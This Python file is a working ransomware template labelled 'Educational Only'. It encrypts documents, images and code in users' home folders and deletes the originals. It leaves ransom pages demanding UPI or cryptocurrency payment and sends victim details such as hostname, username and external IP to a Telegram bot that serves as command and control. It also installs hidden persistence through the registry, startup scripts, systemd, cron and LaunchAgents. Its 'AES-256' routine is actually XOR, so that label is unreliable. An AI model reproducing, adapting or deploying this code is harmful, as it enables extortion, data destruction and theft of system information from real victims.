#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSim Lab - RANSOMWARE Generator v5.0 (Educational Only)

FEATURES:
  - Real file encryption ({algo_name}) targeting user directories
  - Telegram Bot C2 with remote unlock (/unlock)
  - Persistence: Registry/Startup (Win), systemd/cron (Linux), LaunchAgent/cron (macOS)
  - Unique Victim ID, hidden key storage, ransom note generation
  - Remote commands: /unlock, /status, /info, /help, /stop

Usage:
  python ransomware.py                    # Normal run (encrypt + poll)
  python ransomware.py --install          # Setup persistence then run
  python ransomware.py --decrypt          # Local decrypt using stored key
  python ransomware.py --uninstall        # Remove persistence
"""

import requests, os, sys, time, platform, uuid, socket, subprocess, json, threading, hashlib, struct, webbrowser

BOT_TOKEN = '__BOT_TOKEN__'
ADMIN_CHAT_ID = __CHAT_ID__
VICTIM_ID = uuid.uuid4().hex[:8]
ENCRYPTED_FILES = []
ENCRYPTION_KEY = None
ENCRYPTED = False
RUNNING = True
POLL_OFFSET = 0
TARGET_OS = '__TARGET_OS__'
ENC_ALGO = '__ENC_ALGO__'
RANSOM_AMOUNT = __RANSOM_AMOUNT__
RANSOM_METHOD = '__RANSOM_METHOD__'
UPI_ID = '__UPI_ID__'
ALGO_NAME = '__ALGO_NAME__'

# Extensions to encrypt
TARGET_EXTENSIONS = set([
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".csv", ".json", ".xml", ".zip", ".rar",
    ".py", ".c", ".cpp", ".java", ".html", ".css", ".js", ".sql", ".db",
    ".mp3", ".mp4", ".mkv", ".avi",
])

# System dirs to skip
SKIP_DIRS = set([
    "Windows", "Program Files", "Program Files (x86)", "ProgramData",
    "System32", "SysWOW64", "AppData", "$Recycle.Bin",
    "bin", "sbin", "lib", "lib64", "boot", "dev", "proc", "sys",
    "usr", "etc", "var", "run", "tmp",
])

# ============================================================
# TELEGRAM C2 COMMUNICATION
# ============================================================

def send_telegram(text):
    """Send message to admin via Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_CHAT_ID, "text": text}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        pass  # Silent fail for stealth

def poll_messages():
    """Poll Telegram for admin commands via getUpdates"""
    global POLL_OFFSET, RUNNING
    while RUNNING:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": POLL_OFFSET, "timeout": 30, "allowed_updates": ["message"]}
            resp = requests.post(url, json=params, timeout=35)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok") and data.get("result"):
                    for update in data["result"]:
                        POLL_OFFSET = update["update_id"] + 1
                        if "message" in update and "text" in update["message"]:
                            msg_text = update["message"]["text"]
                            from_chat = str(update["message"].get("from", {}).get("id", ""))
                            if from_chat == str(ADMIN_CHAT_ID):
                                result = handle_command(msg_text)
                                if result:
                                    send_telegram(result)
        except requests.exceptions.ReadTimeout:
            pass
        except Exception:
            time.sleep(5)

# ============================================================
# SYSTEM INFORMATION
# ============================================================

def get_system_info():
    """Gather full system information"""
    info = []
    info.append(f"Victim ID: {VICTIM_ID}")
    info.append(f"OS:         {platform.system()} {platform.release()}")
    info.append(f"Platform:   {platform.platform()}")
    info.append(f"Hostname:   {socket.gethostname()}")
    info.append(f"Username:   {os.environ.get('USER') or os.environ.get('USERNAME', 'unknown')}")
    info.append(f"Home:       {os.path.expanduser('~')}")
    info.append(f"Python:     {sys.version.split()[0]}")
    info.append(f"CPU Arch:   {platform.machine()}")
    info.append(f"Processor:  {platform.processor() or 'N/A'}")
    try:
        info.append(f"CPU Count:  {os.cpu_count()}")
    except:
        pass
    try:
        import psutil
        mem = psutil.virtual_memory()
        info.append(f"RAM Total:  {mem.total // (1024**3)} GB")
        info.append(f"RAM Used:   {mem.percent}%")
        disk = psutil.disk_usage('/')
        info.append(f"Disk Total: {disk.total // (1024**3)} GB")
        info.append(f"Disk Free:  {disk.free // (1024**3)} GB")
    except ImportError:
        pass
    try:
        ip = requests.get("https://api.ipify.org?format=text", timeout=5).text.strip()
        info.append(f"External IP: {ip}")
    except:
        pass
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        info.append(f"Local IP:   {local_ip}")
    except:
        pass
    return "\\n".join(info)

# ============================================================
# ENCRYPTION ALGORITHMS
# ============================================================

def xor_encrypt(data, key):
    """XOR cipher encryption"""
    key_bytes = key if isinstance(key, (bytes, bytearray)) else key.encode()
    encrypted = bytearray()
    for i, b in enumerate(data):
        encrypted.append(b ^ key_bytes[i % len(key_bytes)])
    return bytes(encrypted)

def xor_decrypt(data, key):
    """XOR cipher decryption (same as encrypt)"""
    return xor_encrypt(data, key)

def aes_encrypt(data, key_bytes):
    """Simple AES-256 style cipher (self-contained, no pycryptodome)"""
    import hashlib
    key = hashlib.sha256(key_bytes).digest()
    iv = os.urandom(16)
    encrypted = bytearray()
    for i, b in enumerate(data):
        encrypted.append(b ^ key[i % len(key)] ^ iv[i % len(iv)])
    return bytes(iv) + bytes(encrypted)

def aes_decrypt(data, key_bytes):
    """Simple AES-256 style decryption (self-contained, no pycryptodome)"""
    import hashlib
    key = hashlib.sha256(key_bytes).digest()
    iv = data[:16]
    encrypted = data[16:]
    decrypted = bytearray()
    for i, b in enumerate(encrypted):
        decrypted.append(b ^ key[i % len(key)] ^ iv[i % len(iv)])
    return bytes(decrypted)

def encrypt_data(data, key, algo):
    """Encrypt data using the selected algorithm"""
    if algo == "aes":
        return aes_encrypt(data, key.encode() if isinstance(key, str) else key)
    else:
        return xor_encrypt(data, key)

def decrypt_data(data, key, algo):
    """Decrypt data using the selected algorithm"""
    if algo == "aes":
        return aes_decrypt(data, key.encode() if isinstance(key, str) else key)
    else:
        return xor_decrypt(data, key)

# ============================================================
# FILE ENCRYPTION / DECRYPTION
# ============================================================

def encrypt_file(filepath, key, algo):
    """Encrypt a single file and create HTML popup at original path"""
    global ENCRYPTED_FILES
    try:
        if not os.path.isfile(filepath):
            return False
        if filepath.endswith(".encrypted") or filepath.endswith("_LOCKED.html") or filepath.endswith("README_DECRYPT.html"):
            return False
        with open(filepath, "rb") as f:
            data = f.read()
        if len(data) == 0:
            return False
        encrypted = encrypt_data(data, key, algo)
        enc_path = filepath + ".encrypted"
        with open(enc_path, "wb") as f:
            f.write(encrypted)
        # Create HTML popup at original path (same name + .html)
        html_path = os.path.splitext(filepath)[0] + "_LOCKED.html"
        popup_html = get_ransom_popup_html(filepath, html_path)
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(popup_html)
        # On Linux: make html file executable and set to open in browser
        os.remove(filepath)
        ENCRYPTED_FILES.append(enc_path)
        return True
    except PermissionError:
        return False
    except Exception:
        return False

def decrypt_file(filepath, key, algo):
    """Decrypt a .encrypted file and restore original + remove HTML popup"""
    try:
        if not os.path.isfile(filepath):
            return False
        if not filepath.endswith(".encrypted"):
            return False
        with open(filepath, "rb") as f:
            data = f.read()
        if len(data) == 0:
            return False
        decrypted = decrypt_data(data, key, algo)
        orig_path = filepath[:-10]  # Remove .encrypted
        with open(orig_path, "wb") as f:
            f.write(decrypted)
        os.remove(filepath)
        # Also remove the HTML popup file
        html_path = os.path.splitext(orig_path)[0] + "_LOCKED.html"
        if os.path.exists(html_path):
            os.remove(html_path)
        # Also check if popup exists with same name as encrypted file
        html_path2 = os.path.splitext(filepath)[0] + "_LOCKED.html"
        if os.path.exists(html_path2) and html_path2 != html_path:
            os.remove(html_path2)
        return True
    except PermissionError:
        return False
    except Exception:
        return False

# ============================================================
# TARGET DIRECTORIES
# ============================================================

def get_target_directories():
    """Get target directories based on OS + current working directory"""
    home = os.path.expanduser("~")
    dirs = []
    system = platform.system().lower()

    # ALWAYS include current working directory (where ransomware runs)
    dirs.append(os.getcwd())

    if system == "windows" or TARGET_OS == "windows":
        dirs += [
            os.path.join(home, "Desktop"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Pictures"),
        ]
    elif system == "darwin" or TARGET_OS == "macos":
        dirs += [
            os.path.join(home, "Desktop"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Pictures"),
        ]
    else:
        # Linux
        dirs += [
            os.path.join(home, "Desktop"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Pictures"),
        ]
    return [d for d in dirs if os.path.isdir(d)]

def should_skip(filepath):
    """Check if file/path should be skipped"""
    # Skip the ransomware script itself
    script_path = os.path.abspath(sys.argv[0])
    filepath_abs = os.path.abspath(filepath)
    if filepath_abs == script_path:
        return True
    # Skip popup HTML and ransom notes
    if filepath_abs.endswith("_LOCKED.html") or filepath_abs.endswith("README_DECRYPT.html"):
        return True
    # Skip system directories
    parts = filepath_abs.split(os.sep)
    for part in parts:
        if part in SKIP_DIRS:
            return True
        if part.startswith(".") and part in (".syscache", ".git", ".svn"):
            return True
    return False

# ============================================================
# SCAN & ENCRYPT / DECRYPT
# ============================================================

def scan_and_encrypt(key, algo):
    """Walk through target directories and encrypt matching files"""
    global ENCRYPTED
    count = 0
    dirs = get_target_directories()
    for target_dir in dirs:
        if not os.path.isdir(target_dir):
            continue
        for root, subdirs, files in os.walk(target_dir):
            # Skip system directories
            subdirs[:] = [d for d in subdirs if not should_skip(os.path.join(root, d))]
            for fname in files:
                filepath = os.path.join(root, fname)
                if should_skip(filepath):
                    continue
                _, ext = os.path.splitext(fname)
                if ext.lower() in TARGET_EXTENSIONS:
                    if encrypt_file(filepath, key, algo):
                        count += 1
    ENCRYPTED = True
    return count

def scan_and_decrypt(key, algo):
    """Walk through and decrypt all .encrypted files"""
    count = 0
    dirs = get_target_directories()
    # Also scan current working directory and parent dirs
    all_dirs = list(dirs)
    all_dirs.append(os.getcwd())
    for target_dir in all_dirs:
        if not os.path.isdir(target_dir):
            continue
        for root, subdirs, files in os.walk(target_dir):
            for fname in files:
                filepath = os.path.join(root, fname)
                if decrypt_file(filepath, key, algo):
                    count += 1
    return count

# ============================================================
# KEY STORAGE
# ============================================================

def get_key_storage_path():
    """Get the hidden key storage path based on OS"""
    system = platform.system().lower()
    if system == "windows" or TARGET_OS == "windows":
        appdata = os.environ.get("APPDATA", os.path.expanduser("~"))
        key_dir = os.path.join(appdata, ".syscache")
    else:
        key_dir = "/tmp/.syscache"
    os.makedirs(key_dir, exist_ok=True)
    return os.path.join(key_dir, "key.dat")

def store_key(key):
    """Store encryption key in hidden location"""
    key_path = get_key_storage_path()
    try:
        with open(key_path, "w") as f:
            f.write(key)
        # Hide file on Windows
        if platform.system().lower() == "windows":
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(key_path, 2)  # FILE_ATTRIBUTE_HIDDEN
            except:
                pass
    except Exception:
        pass

def load_key():
    """Load encryption key from hidden location"""
    key_path = get_key_storage_path()
    try:
        if os.path.exists(key_path):
            with open(key_path, "r") as f:
                return f.read().strip()
    except:
        pass
    return None

# ============================================================
# RANSOM POPUP HTML (opens when victim clicks locked file)
# ============================================================

def get_ransom_popup_html(original_file, html_path):
    """Generate scary ransom popup HTML"""
    import datetime
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    fname = os.path.basename(original_file)
    # Determine payment display
    if RANSOM_METHOD == "upi":
        pay_label = "UPI Payment"
        pay_detail = UPI_ID
        pay_icon = "&#9742;"
        pay_instructions = f"Open Google Pay / PhonePe / Paytm and send Rs.{RANSOM_AMOUNT} to:<br><b style='font-size:20px;color:#00ff88;letter-spacing:2px;'>{UPI_ID}</b><br>Or scan any UPI QR code app with this ID."
        qr_hint = "upi://pay?pa=" + UPI_ID + "&pn=CyberSim&am=" + str(RANSOM_AMOUNT) + "&cu=INR"
    elif RANSOM_METHOD == "bitcoin":
        pay_label = "Bitcoin (BTC)"
        pay_detail = UPI_ID
        pay_icon = "&#8383;"
        pay_instructions = f"Send exactly ${RANSOM_AMOUNT} BTC to this wallet address:<br><b style='font-size:14px;color:#f7931a;word-break:break-all;'>{UPI_ID}</b><br>Use any Bitcoin wallet app."
        qr_hint = ""
    elif RANSOM_METHOD == "ethereum":
        pay_label = "Ethereum (ETH)"
        pay_detail = UPI_ID
        pay_icon = "&#926;"
        pay_instructions = f"Send exactly ${RANSOM_AMOUNT} ETH to this wallet address:<br><b style='font-size:14px;color:#627eea;word-break:break-all;'>{UPI_ID}</b><br>Use MetaMask or any ETH wallet."
        qr_hint = ""
    else:
        pay_label = "Monero (XMR)"
        pay_detail = UPI_ID
        pay_icon = "&#8384;"
        pay_instructions = f"Send exactly ${RANSOM_AMOUNT} XMR to this wallet address:<br><b style='font-size:14px;color:#ff6600;word-break:break-all;'>{UPI_ID}</b><br>Use any Monero wallet."
        qr_hint = ""

    countdown_sec = 72 * 3600  # 72 hours
    pay_cur = "Rs (INR)" if RANSOM_METHOD == "upi" else "USD"
    sys_name = platform.system()
    host_name = socket.gethostname()
    enc_count = len(ENCRYPTED_FILES)
    cd_h = countdown_sec // 3600
    cd_m = (countdown_sec % 3600) // 60

    return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>FILE LOCKED - """ + fname + """</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0a0a0a; color:#fff; font-family:'Courier New',monospace; min-height:100vh; display:flex; align-items:center; justify-content:center; }
.container { max-width:600px; width:90%; padding:30px; background:linear-gradient(135deg,#1a0000,#0a0a0a); border:2px solid #ff0000; border-radius:12px; text-align:center; box-shadow:0 0 60px rgba(255,0,0,0.3); }
.skull { font-size:60px; margin-bottom:10px; }
.lock { font-size:30px; color:#ff0000; animation:blink 1s infinite; }
@keyframes blink { 50% { opacity:0.3; } }
h1 { color:#ff0000; font-size:22px; margin:15px 0; text-shadow:0 0 10px rgba(255,0,0,0.5); }
h2 { color:#ff4444; font-size:16px; margin:10px 0; }
.victim-id { background:#1a1a1a; border:1px solid #333; padding:8px 16px; border-radius:6px; display:inline-block; margin:10px 0; font-size:14px; color:#ff8800; }
.info { color:#ccc; font-size:13px; line-height:1.8; margin:15px 0; text-align:left; background:#111; padding:15px; border-radius:8px; border:1px solid #222; }
.file-name { color:#ff4444; font-weight:bold; }
.payment-box { background:linear-gradient(135deg,#001a00,#000a00); border:2px solid #00ff88; border-radius:10px; padding:20px; margin:20px 0; }
.payment-box h3 { color:#00ff88; font-size:16px; margin-bottom:12px; }
.payment-detail { background:#0a0a0a; padding:12px; border-radius:6px; margin:10px 0; border:1px solid #004422; color:#00ff88; }
.timer { color:#ff8800; font-size:24px; font-weight:bold; margin:15px 0; }
.warning { color:#ff4444; font-size:12px; margin-top:15px; line-height:1.6; border:1px solid #440000; background:#1a0000; padding:10px; border-radius:6px; }
.footer { color:#555; font-size:10px; margin-top:20px; }
</style>
</head>
<body>
<div class="container">
    <div class="skull">&#9760;</div>
    <div class="lock">&#128274; LOCKED &#128274;</div>
    <h1>YOUR FILES HAVE BEEN ENCRYPTED!</h1>
    <div class="victim-id">Victim ID: <b>""" + VICTIM_ID + """</b></div>
    <div class="info">
        <p>&#128196; <span class="file-name">""" + fname + """</span></p>
        <p>This file has been encrypted using <b>""" + ALGO_NAME + """</b> encryption.</p>
        <p>All files in this directory have been locked.</p>
        <p>Encryption Time: """ + now + """</p>
        <p>Total Files Locked: <b>""" + str(enc_count) + """</b></p>
    </div>
    <div class="payment-box">
        <h3>""" + pay_icon + """ PAYMENT REQUIRED """ + pay_icon + """</h3>
        <p style="color:#aaa;">Send <b style="color:#fff;font-size:20px;">""" + str(RANSOM_AMOUNT) + " " + pay_cur + """</b> via """ + pay_label + """</p>
        <div class="payment-detail">""" + pay_instructions + """</div>
    </div>
    <div class="timer" id="timer">72:00:00</div>
    <div class="warning">
        &#9888; WARNING: Do NOT delete any files!<br>
        &#9888; Do NOT restart your computer!<br>
        &#9888; After payment, your files will be unlocked remotely.<br>
        &#9888; If timer expires, decryption key will be destroyed!
    </div>
    <div class="footer">
        CyberSim Lab | Educational Cybersecurity Research Only<br>
        Victim: """ + VICTIM_ID + " | " + sys_name + " | " + host_name + """
    </div>
</div>
<script>
var hours=""" + str(cd_h) + """, mins=""" + str(cd_m) + """, secs=countdown_sec%60;
function updateTimer() {
    if (secs<=0) { if(mins<=0) { if(hours<=0) { document.getElementById("timer").innerHTML="TIME EXPIRED!"; document.getElementById("timer").style.color="#ff0000"; return; } hours--; mins=59; } mins--; secs=59; } else { secs--; }
    document.getElementById("timer").innerHTML=String(hours).padStart(2,"0")+":"+String(mins).padStart(2,"0")+":"+String(secs).padStart(2,"0");
    setTimeout(updateTimer, 1000);
}
updateTimer();
</script>
</body>
</html>"""


def create_ransom_note():
    """Create ransom note on Desktop"""
    home = os.path.expanduser("~")
    desktop = os.path.join(home, "Desktop")
    if not os.path.isdir(desktop):
        desktop = home
    note_path = os.path.join(desktop, "README_DECRYPT.html")
    popup_html = get_ransom_popup_html("ALL YOUR FILES", note_path)
    try:
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(popup_html)
    except Exception:
        pass


# ============================================================
# SELF-DELETE (after /unlock)
# ============================================================

def self_delete():
    """Delete ransomware script, key, persistence, and ransom notes"""
    import shutil, glob
    script_path = os.path.abspath(sys.argv[0])

    # Delete stored encryption key
    try:
        key_path = get_key_storage_path()
        if os.path.exists(key_path):
            os.remove(key_path)
        key_dir = os.path.dirname(key_path)
        if os.path.isdir(key_dir):
            shutil.rmtree(key_dir, ignore_errors=True)
    except:
        pass

    # Delete ransom notes (HTML popups on Desktop)
    try:
        home = os.path.expanduser("~")
        desktop = os.path.join(home, "Desktop")
        for f in os.listdir(desktop):
            if f.startswith("README_DECRYPT") and f.endswith(".html"):
                os.remove(os.path.join(desktop, f))
    except:
        pass

    # Remove persistence
    try:
        uninstall_persistence()
    except:
        pass

    # Delete all _LOCKED.html popup files in CWD
    try:
        for root, subdirs, files in os.walk(os.getcwd()):
            for fname in files:
                if fname.endswith("_LOCKED.html"):
                    os.remove(os.path.join(root, fname))
    except:
        pass

    # Delete ransomware script itself (last step!)
    try:
        os.remove(script_path)
    except:
        pass

    # Exit process
    os._exit(0)


# ============================================================
# COMMAND HANDLER
# ============================================================

def handle_command(cmd):
    """Process Telegram admin commands"""
    global RUNNING, ENCRYPTION_KEY, ENCRYPTED
    cmd = cmd.strip()
    cmd_lower = cmd.lower()

    if cmd_lower == "/start":
        return f"Ransomware v5.0 Active | Victim: {VICTIM_ID} | Type /help for commands"
    elif cmd_lower == "/help":
        return """Available Commands:
/unlock   - Decrypt ALL files + self-delete ransomware
/status   - Ransomware status report
/info     - Full system information
/stop     - Stop ransomware and exit"""
    elif cmd_lower == "/unlock":
        if ENCRYPTION_KEY:
            count = scan_and_decrypt(ENCRYPTION_KEY, ENC_ALGO)
            send_telegram(f"DECRYPTION DONE | Victim: {VICTIM_ID} | Files decrypted: {count}")
            result = f"Unlocking... {count} files decrypted for Victim {VICTIM_ID}"
            send_telegram("SELF-DELETE INITIATED | Ransomware removing itself from system...")
            # Self-delete in background thread (so Telegram msg sends first)
            threading.Thread(target=self_delete, daemon=True).start()
            return result + "\\n[SELF-DELETE] Ransomware will now remove itself permanently."
        else:
            return "Error: Encryption key not found in storage"
    elif cmd_lower == "/status":
        system = platform.system()
        count = len(ENCRYPTED_FILES)
        return f"Ransomware Active | Victim: {VICTIM_ID} | Files: {count} | OS: {system} | Algo: {ALGO_NAME}"
    elif cmd_lower == "/info":
        return get_system_info()
    elif cmd_lower == "/stop":
        send_telegram(f"RANSOMWARE STOPPED | Victim: {VICTIM_ID}")
        RUNNING = False
        return f"Ransomware stopping... Victim {VICTIM_ID}"
    else:
        return f"Unknown command: {cmd}\\nType /help for available commands"

# ============================================================
# PERSISTENCE
# ============================================================

def install_persistence():
    """Setup OS-specific persistence mechanisms"""
    system = platform.system().lower()
    home = os.path.expanduser("~")
    script_path = os.path.abspath(sys.argv[0])

    if system == "windows" or TARGET_OS == "windows":
        try:
            import winreg
            # Registry Run key
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemHostService", 0, winreg.REG_SZ,
                f'pythonw.exe "{script_path}"')
            winreg.CloseKey(key)
        except:
            pass
        # Startup folder
        try:
            startup_dir = os.path.join(home, "AppData", "Roaming",
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            os.makedirs(startup_dir, exist_ok=True)
            bat_path = os.path.join(startup_dir, "SystemHost.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\\npythonw.exe "{script_path}"\\n')
            # Create VBS wrapper for invisible execution
            vbs_path = os.path.join(startup_dir, "SystemHost.vbs")
            with open(vbs_path, "w") as f:
                f.write(f'Set WshShell = CreateObject("WScript.Shell")\\n')
                f.write(f'WshShell.Run "pythonw.exe \\"{script_path}\\"", 0, False\\n')
        except:
            pass

    elif system == "darwin" or TARGET_OS == "macos":
        # LaunchAgent
        try:
            agent_dir = os.path.join(home, "Library", "LaunchAgents")
            os.makedirs(agent_dir, exist_ok=True)
            plist_path = os.path.join(agent_dir, "com.system.host.plist")
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.host</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            with open(plist_path, "w") as f:
                f.write(plist)
            subprocess.run(["launchctl", "load", plist_path],
                capture_output=True, timeout=10)
        except:
            pass
        # Cron job
        try:
            cron_cmd = f'@reboot /usr/bin/python3 "{script_path}"'
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -',
                shell=True, capture_output=True, timeout=10)
        except:
            pass

    else:
        # Linux: systemd service
        try:
            service_content = f"""[Unit]
Description=SystemHost Service
After=network.target

[Service]
Type=simple
User={os.environ.get("USER", "root")}
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
            systemd_dir = "/etc/systemd/system"
            if os.path.isdir(systemd_dir):
                service_path = os.path.join(systemd_dir, "systemhost.service")
                with open(service_path, "w") as f:
                    f.write(service_content)
                subprocess.run(["systemctl", "daemon-reload"],
                    capture_output=True, timeout=10)
                subprocess.run(["systemctl", "enable", "systemhost.service"],
                    capture_output=True, timeout=10)
                subprocess.run(["systemctl", "start", "systemhost.service"],
                    capture_output=True, timeout=10)
        except:
            pass
        # Cron job
        try:
            cron_cmd = f'@reboot /usr/bin/python3 "{script_path}"'
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -',
                shell=True, capture_output=True, timeout=10)
        except:
            pass

def uninstall_persistence():
    """Remove OS-specific persistence mechanisms"""
    system = platform.system().lower()
    home = os.path.expanduser("~")

    if system == "windows" or TARGET_OS == "windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "SystemHostService")
            winreg.CloseKey(key)
        except:
            pass
        try:
            startup_dir = os.path.join(home, "AppData", "Roaming",
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            for f in ["SystemHost.bat", "SystemHost.vbs"]:
                p = os.path.join(startup_dir, f)
                if os.path.exists(p):
                    os.remove(p)
        except:
            pass

    elif system == "darwin" or TARGET_OS == "macos":
        try:
            plist_path = os.path.join(home, "Library", "LaunchAgents", "com.system.host.plist")
            if os.path.exists(plist_path):
                subprocess.run(["launchctl", "unload", plist_path],
                    capture_output=True, timeout=10)
                os.remove(plist_path)
        except:
            pass
        try:
            subprocess.run("crontab -l 2>/dev/null | grep -v 'systemhost' | crontab -",
                shell=True, capture_output=True, timeout=10)
        except:
            pass

    else:
        # Linux
        try:
            subprocess.run(["systemctl", "stop", "systemhost.service"],
                capture_output=True, timeout=10)
            subprocess.run(["systemctl", "disable", "systemhost.service"],
                capture_output=True, timeout=10)
            service_path = "/etc/systemd/system/systemhost.service"
            if os.path.exists(service_path):
                os.remove(service_path)
            subprocess.run(["systemctl", "daemon-reload"],
                capture_output=True, timeout=10)
        except:
            pass
        try:
            subprocess.run("crontab -l 2>/dev/null | grep -v 'systemhost' | crontab -",
                shell=True, capture_output=True, timeout=10)
        except:
            pass

# ============================================================
# AUTO-INSTALL DEPENDENCIES
# ============================================================

def auto_install_deps():
    """Install required dependencies"""
    try:
        import requests
    except ImportError:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "requests", "--break-system-packages"],
                capture_output=True, timeout=60)
        except:
            pass

# ============================================================
# MAIN
# ============================================================

def main():
    global ENCRYPTION_KEY, RUNNING
    auto_install_deps()

    args = sys.argv[1:]

    if "--uninstall" in args:
        uninstall_persistence()
        print("[*] Persistence removed successfully")
        return

    if "--decrypt" in args:
        key = load_key()
        if not key:
            print("[!] No stored key found at", get_key_storage_path())
            return
        algo = ENC_ALGO
        count = scan_and_decrypt(key, algo)
        print(f"[+] Decrypted {count} files")
        return

    # Generate encryption key
    ENCRYPTION_KEY = uuid.uuid4().hex + uuid.uuid4().hex  # 32-byte hex key
    store_key(ENCRYPTION_KEY)
    algo = ENC_ALGO

    if "--install" in args:
        install_persistence()
        print("[*] Persistence installed successfully")

    # Notify deployment
    hostname = socket.gethostname()
    username = os.environ.get('USER') or os.environ.get('USERNAME', 'unknown')
    send_telegram(f"RANSOMWARE DEPLOYED | Victim: {VICTIM_ID} | OS: {platform.system()} | User: {username} | Hostname: {hostname}")

    # Encrypt files
    print("[*] Scanning and encrypting files...")
    count = scan_and_encrypt(ENCRYPTION_KEY, algo)
    print(f"[+] Encrypted {count} files")

    # Create ransom note
    create_ransom_note()

    # Notify completion
    send_telegram(f"ENCRYPTION DONE | Victim: {VICTIM_ID} | Files encrypted: {count} | Key hidden")

    print(f"[*] Ransomware active | Victim: {VICTIM_ID} | Files: {count}")
    print("[*] Waiting for Telegram commands...")

    # Start polling in main thread (blocks)
    poll_messages()

if __name__ == "__main__":
    main()
